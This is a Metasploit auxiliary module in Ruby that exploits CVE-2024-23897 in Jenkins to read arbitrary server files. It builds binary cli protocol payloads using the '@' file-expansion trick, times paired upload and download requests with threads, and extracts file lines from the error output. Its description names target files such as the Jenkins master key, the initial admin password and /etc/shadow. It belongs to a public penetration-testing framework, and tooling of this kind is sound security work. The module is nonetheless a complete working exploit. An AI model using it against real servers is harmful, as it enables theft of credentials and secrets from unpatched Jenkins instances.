##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Jenkins
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jenkins cli Ampersand Replacement Arbitrary File Read',
        'Description' => %q{
          This module utilizes the Jenkins cli protocol to run the `help` command.
          The cli is accessible with read-only permissions by default, which are
          all thats required.

          Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
          replace any `@<filename>` with the contents of a file. We are then able to retrieve
          the error message to read up to the first two lines of a file.

          Exploitation by hand can be done with the cli, see markdown documents for additional
          instructions.

          There are a few exploitation oddities:
          1. The injection point for the `help` command requires 2 input arguments.
          When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
          If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
          However, we can pad out the content by supplying a first argument.
          2. There is a strange timing requirement where the `download` (or first) request must get
          to the server first, but the `upload` (or second) request must be very close behind it.
          From testing against the docker image, it was found values between `.01` and `1.9` were
          viable. Due to the round trip time of the first request and response happening before
          request 2 would be received, it is necessary to use threading to ensure the requests
          happen within rapid succession.

          Files of value:
          * /var/jenkins_home/secret.key
          * /var/jenkins_home/secrets/master.key
          * /var/jenkins_home/secrets/initialAdminPassword
          * /etc/passwd
          * /etc/shadow
          * Project secrets and credentials
          * Source code, build artifacts
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Yaniv Nizry', # discovery
          'binganao', # poc
          'h4x0r-dz', # poc
          'Vozec' # poc
        ],
        'References' => [
          [ 'URL', 'https://www.jenkins.io/security/advisory/2024-01-24/'],
          [ 'URL', 'https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/'],
          [ 'URL', 'https://github.com/binganao/CVE-2024-23897'],
          [ 'URL', 'https://github.com/h4x0r-dz/CVE-2024-23897'],
          [ 'URL', 'https://github.com/Vozec/CVE-2024-23897'],
          [ 'CVE', '2024-23897']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2024-01-24',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ ],
          'SideEffects' => [ ]
        },
        'DefaultOptions' => {
          'RPORT' => 8080,
          'HttpClientTimeout' => 3 # very quick response, so set this low
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Jenkins', '/']),
        OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
      ]
    )
    register_advanced_options(
      [
        OptFloat.new('DELAY', [true, 'Delay between first and second request', 0.5]),
        OptString.new('ENCODING', [true, 'Encoding to use for reading the file', 'UTF-8']),
        OptString.new('LOCALITY', [true, 'Locality to use for reading the file', 'en_US'])
      ]
    )
  end

  def check
    version = jenkins_version

    return Exploit::CheckCode::Safe('Unable to determine Jenkins version number') if version.blank?

    version = Rex::Version.new(version)

    if version <= Rex::Version.new('2.426.2') || # LTS check
       (version >= Rex::Version.new('2.427') && version <= Rex::Version.new('2.441')) # non-lts
      return Exploit::CheckCode::Appears("Found exploitable version: #{version}")
    end

    Exploit::CheckCode::Safe("Found non-exploitable version: #{version}")
  end

  def request_header
    "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00"
  end

  def request_footer
    data = []
    data << "\x00\x00\x00\x07\x02\x00"
    data << [datastore['ENCODING'].length].pack('C') # length of encoding string
    data << datastore['ENCODING']
    data << "\x00\x00\x00\x07\x01\x00"
    data << [datastore['LOCALITY'].length].pack('C') # length of locality string
    data << datastore['LOCALITY']
    data << "\x00\x00\x00\x00\x03"
    data
  end

  def parameter_one
    # a literal parameter of 1
    "\x03\x00\x00\x01\x31\x00\x00\x00"
  end

  def data_generator(pad: false)
    data = []
    data << request_header
    data << parameter_one if pad
    data << [datastore['FILE_PATH'].length + 3].pack('C').to_s
    data << "\x00\x00"
    data << [datastore['FILE_PATH'].length + 1].pack('C').to_s
    data << "\x40"
    data << datastore['FILE_PATH']
    data << request_footer
    data.join('')
  end

  def upload_request(uuid, multi_line_file: true)
    # send upload request asking for file

    # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
    # which is required for successful exploitation
    sleep(datastore['DELAY'])
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => 'application/octet-stream',
      'headers' => {
        'Session' => uuid,
        'Side' => 'upload'
      },
      'vars_get' => {
        'remoting' => 'false'
      },
      'data' => data_generator(pad: multi_line_file)
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to upload request (response code: #{res.code})") unless res.code == 200
    # we don't get a response here, so we just need the request to go through and 200 us
  end

  def process_result(use_pad)
    # the output comes back as follows:

    # ERROR: Too many arguments: <line 2>
    # java -jar jenkins-cli.jar help
    #   [COMMAND]
    # Lists all the available commands or a detailed description of single command.
    #   COMMAND : Name of the command (default: <line 1>)

    # The main thing here is we get the first 2 lines of output from the file.
    # The 2nd line from the file is returned on line 1 of the output, and line
    # 1 from the file is returned on the last line of output. If padding was used
    # then <line 1> will just be a literal 1

    file_contents = []
    @content_body.split("\n").each do |html_response_line|
      # filter for the two lines which have output
      if html_response_line.include? 'ERROR: Too many arguments'
        file_contents << html_response_line.gsub('ERROR: Too many arguments: ', '').strip
      elsif html_response_line.include? 'COMMAND : Name of the command (default:'
        temp = html_response_line.gsub(' COMMAND : Name of the command (default: ', '')
        temp = temp.chomp(')').strip
        file_contents.insert(0, temp)
      end
    end
    return if file_contents.empty?

    # if we padded out, then our first line is 1, so drop that
    file_contents = file_contents.drop(1) if use_pad == true

    print_good("#{datastore['FILE_PATH']} file contents retrieved (first line or 2):\n#{file_contents.join("\n")}")
    stored_path = store_loot('jenkins.file', 'text/plain', rhost, file_contents.join("\n"), datastore['FILE_PATH'])
    print_good("Results saved to: #{stored_path}")
  end

  def download_request(uuid)
    # send download request
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'headers' => {
        'Session' => uuid,
        'Side' => 'download'
      },
      'vars_get' => {
        'remoting' => 'false'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to download request (response code: #{res.code})") unless res.code == 200

    @content_body = res.body
  end

  def run
    uuid = SecureRandom.uuid

    print_status("Sending requests with UUID: #{uuid}")

    # Looking over the python PoCs, they all include threading however
    # the writeup, and PoCs don't mention a timing component.
    # However, during testing it was found that the two requests need to
    # hit the server nearly simultaneously, with the 'download' one hitting
    # first. During testing, even a .1 second slowdown was too much and
    # the server resulted in a 500 error. So we need to thread these to
    # execute them fast enough that the server gets both in rapid succession

    use_pad = false
    threads = []
    threads << framework.threads.spawn('CVE-2024-23897', false) do
      upload_request(uuid, multi_line_file: use_pad) # try single line file first since we get an error if we have more content to get
    end
    threads << framework.threads.spawn('CVE-2024-23897', false) do
      download_request(uuid)
    end

    threads.map do |t|
      t.join
    rescue StandardError
      nil
    end

    # we got an error that means we need to pad out our value, so rerun with pad
    if @content_body && @content_body.include?('ERROR: You must authenticate to access this Jenkins.')
      print_status('Re-attempting with padding for single line output file')
      use_pad = true
      threads = []
      threads << framework.threads.spawn('CVE-2024-23897-upload', false) do
        upload_request(uuid, multi_line_file: use_pad)
      end
      threads << framework.threads.spawn('CVE-2024-23897-download', false) do
        download_request(uuid)
      end

      threads.map do |t|
        t.join
      rescue StandardError
        nil
      end
    end

    if @content_body
      process_result(use_pad)
    else
      print_bad('Exploit failed, no exploit data was successfully returned')
    end
  end
end
